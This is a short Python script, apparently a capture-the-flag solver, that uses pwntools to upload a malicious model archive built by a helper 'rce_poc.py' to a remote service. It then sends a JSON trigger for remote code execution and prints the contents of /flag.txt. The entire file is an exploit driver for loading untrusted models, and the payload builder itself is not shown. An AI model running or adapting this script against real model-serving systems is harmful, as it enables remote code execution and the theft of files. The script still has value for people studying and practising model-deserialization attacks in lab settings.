import sys
import subprocess
import json
from pwn import *

host = sys.argv[1]
port = sys.argv[2]


print(subprocess.check_output(["python3", "rce_poc.py", "models/rce_poc", "/flag.txt"]))

conn = remote(host, port)

with open("models/rce_poc.zip", 'rb') as f:
    zip_data = f.read()

conn.sendline(str(len(zip_data)).encode())

conn.recvuntil(b"Send me the zip archive with your model\n")

conn.send(zip_data)

conn.recvuntil(b"Expecting features")

conn.recvuntil(b"]\n")

pld = {'cat': 'rce'}
conn.sendline(json.dumps(pld).encode())

flag = conn.recvall(timeout=1)

print(flag)

conn.sendline(b"exit\n")


# conn.interactive()


conn.close()